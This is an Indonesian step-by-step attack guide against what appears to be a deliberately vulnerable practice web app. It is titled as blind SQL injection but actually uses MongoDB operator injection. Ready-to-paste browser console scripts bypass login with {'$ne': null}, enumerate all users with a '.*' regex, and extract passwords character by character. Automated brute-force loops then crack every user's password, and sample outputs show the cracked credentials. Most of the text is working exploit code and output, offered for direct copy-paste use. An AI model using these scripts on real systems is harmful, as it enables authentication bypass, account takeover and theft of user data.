# BLIND SQL INJECTION - STEP BY STEP ATTACK

## STEP 1: Auth Bypass (Login tanpa password)

**Apa yang dilakukan:**
- Login sebagai admin tanpa tahu password
- Menggunakan operator MongoDB `{"$ne": null}` (tidak sama dengan null)

**Cara:**
1. Buka browser → https://penetration-testing-iota.vercel.app
2. Tekan F12 (buka Developer Tools)
3. Klik tab "Console"
4. Paste command ini:

```javascript
fetch('https://penetration-testing-iota.vercel.app/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({username: "admin", password: {"$ne": null}})
}).then(r => r.json()).then(d => console.log(d))
```

5. Tekan Enter

**Expected Result:**
```
{success: true, message: "Login successful", user: "admin", token: "..."}
```

✅ **BOOM! Login tanpa password!**

---

## STEP 2: Enumerate (List semua users)

**Apa yang dilakukan:**
- Ambil daftar semua username & email dari database
- Menggunakan regex pattern `.*` (match semua)

**Cara:**
1. Di Console yang sama, paste:

```javascript
fetch('https://penetration-testing-iota.vercel.app/api/search', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({query: ".*"})
}).then(r => r.json()).then(d => console.table(d.results.map(u => ({username: u.username, email: u.email}))))
```

2. Tekan Enter

**Expected Result:**
```
┌─────────┬──────────────────────┐
│ (index) │ username │ email     │
├─────────┼──────────┼───────────┤
│ 0       │ admin    │ admin@... │
│ 1       │ ibnu     │ ibnu@...  │
│ 2       │ zaky     │ zaky@...  │
│ 3       │ tjokorde │ tjokorde@ │
│ 4       │ agung    │ agung@... │
└─────────┴──────────┴───────────┘
```

✅ **Database enumerated!**

---

## STEP 3: Blind Injection (Test char-by-char)

**Apa yang dilakukan:**
- Cek apakah password dimulai dengan karakter tertentu
- Menggunakan regex pattern `^a` (dimulai dengan 'a')

**Test 1 - Cek dimulai dengan 'a':**

```javascript
fetch('https://penetration-testing-iota.vercel.app/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({username: "admin", password: {"$regex": "^a"}})
}).then(r => r.json()).then(d => console.log(d.success ? "✅ Yes, starts with 'a'" : "❌ No"))
```

**Result: ✅ Yes** (karena password admin adalah "admin123")

---

**Test 2 - Cek dimulai dengan 'b':**

```javascript
fetch('https://penetration-testing-iota.vercel.app/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({username: "admin", password: {"$regex": "^b"}})
}).then(r => r.json()).then(d => console.log(d.success ? "✅ Yes" : "❌ No"))
```

**Result: ❌ No** (tidak dimulai dengan 'b')

---

**Test 3 - Cek dimulai dengan 'ad':**

```javascript
fetch('https://penetration-testing-iota.vercel.app/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({username: "admin", password: {"$regex": "^ad"}})
}).then(r => r.json()).then(d => console.log(d.success ? "✅ Yes, starts with 'ad'" : "❌ No"))
```

**Result: ✅ Yes**

---

**Test 4 - Cek "^adm":**

```javascript
fetch('https://penetration-testing-iota.vercel.app/api/login', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({username: "admin", password: {"$regex": "^adm"}})
}).then(r => r.json()).then(d => console.log(d.success ? "✅ Yes" : "❌ No"))
```

✅ **Terus lakukan ini sampai ketemu full password: "admin123"**

---

## STEP 4: Brute Force (Auto crack password)

**Apa yang dilakukan:**
- Secara otomatis test semua kombinasi karakter
- Sampai password lengkap ketemu

**Paste script ini:**

```javascript
async function bruteForceAdmin() {
  let password = "";
  const charset = "abcdefghijklmnopqrstuvwxyz0123456789";
  console.log("🔓 Cracking admin password...");
  
  for (let i = 0; i < 20; i++) {
    let found = false;
    for (let char of charset) {
      const res = await fetch('https://penetration-testing-iota.vercel.app/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({username: "admin", password: {"$regex": `^${password + char}`}})
      });
      if ((await res.json()).success) {
        password += char;
        console.log(`Found: ${password}`);
        found = true;
        break;
      }
    }
    if (!found) break;
  }
  console.log("✅ Final password: " + password);
  return password;
}

bruteForceAdmin();
```

**Expected Output:**
```
🔓 Cracking admin password...
Found: a
Found: ad
Found: adm
Found: admi
Found: admin
Found: admin1
Found: admin12
Found: admin123
✅ Final password: admin123
```

---

## STEP 5: Crack ALL Passwords (5 users)

**Apa yang dilakukan:**
- Crack password untuk semua 5 users sekaligus
- Lama: ~30 detik

**Paste script ini:**

```javascript
async function bruteForceAll() {
  const users = ["admin", "ibnu", "zaky", "tjokorde", "agung"];
  const results = {};
  
  for (let user of users) {
    let password = "";
    const charset = "abcdefghijklmnopqrstuvwxyz0123456789";
    console.log(`\n🔓 Cracking ${user}...`);
    
    for (let i = 0; i < 20; i++) {
      let found = false;
      for (let char of charset) {
        const res = await fetch('https://penetration-testing-iota.vercel.app/api/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({username: user, password: {"$regex": `^${password + char}`}})
        });
        if ((await res.json()).success) {
          password += char;
          console.log(`  ${password}`);
          found = true;
          break;
        }
      }
      if (!found) break;
    }
    results[user] = password;
    console.log(`✅ ${user}: ${password}`);
  }
  
  console.log("\n🎉 ALL PASSWORDS CRACKED!");
  console.table(results);
}

bruteForceAll();
```

**Expected Output:**
```
🔓 Cracking admin...
  ✅ admin: admin123

🔓 Cracking ibnu...
  ✅ ibnu: ibnu123

🔓 Cracking zaky...
  ✅ zaky: zaky123

🔓 Cracking tjokorde...
  ✅ tjokorde: tjokorde123

🔓 Cracking agung...
  ✅ agung: agung123

🎉 ALL PASSWORDS CRACKED!
┌──────────┬────────────┐
│ username │ password   │
├──────────┼────────────┤
│ admin    │ admin123   │
│ ibnu     │ ibnu123    │
│ zaky     │ zaky123    │
│ tjokorde │ tjokorde123│
│ agung    │ agung123   │
└──────────┴────────────┘
```

---

## STEP 6: Login & Access Dashboard

**Sekarang gunakan password yang sudah di-crack untuk login normal:**

1. Buka: https://penetration-testing-iota.vercel.app
2. Login dengan salah satu user yang sudah di-crack:
   - Username: **ibnu**
   - Password: **ibnu123**
3. Klik **Login**
4. Sekarang bisa akses **Dashboard** dan lihat semua user data

✅ **SYSTEM COMPROMISED!**

---

## RINGKASAN ATTACK

```
┌─────────────────────────────────────────────────┐
│ STEP 1: Auth Bypass                             │
│ → Login tanpa password: {"$ne": null}          │
├─────────────────────────────────────────────────┤
│ STEP 2: Enumerate Users                         │
│ → Ambil list semua users dengan regex ".*"     │
├─────────────────────────────────────────────────┤
│ STEP 3: Blind Injection Test                    │
│ → Test char-by-char: "^a", "^ad", "^adm"...   │
├─────────────────────────────────────────────────┤
│ STEP 4: Brute Force Single Password             │
│ → Auto crack password admin → "admin123"        │
├─────────────────────────────────────────────────┤
│ STEP 5: Brute Force All 5 Passwords             │
│ → Crack semua users dalam ~30 detik            │
├─────────────────────────────────────────────────┤
│ STEP 6: Login & Access                          │
│ → Login dengan user yang sudah di-crack        │
│ → Access dashboard & sensitive data            │
└─────────────────────────────────────────────────┘
```

---

## 🎯 SETIAP STEP BISA DICOBA LANGSUNG!

Tidak perlu ubah kode sama sekali - tinggal copy-paste di console dan jalankan!

**Total waktu: ~5 menit untuk pahami semuanya**
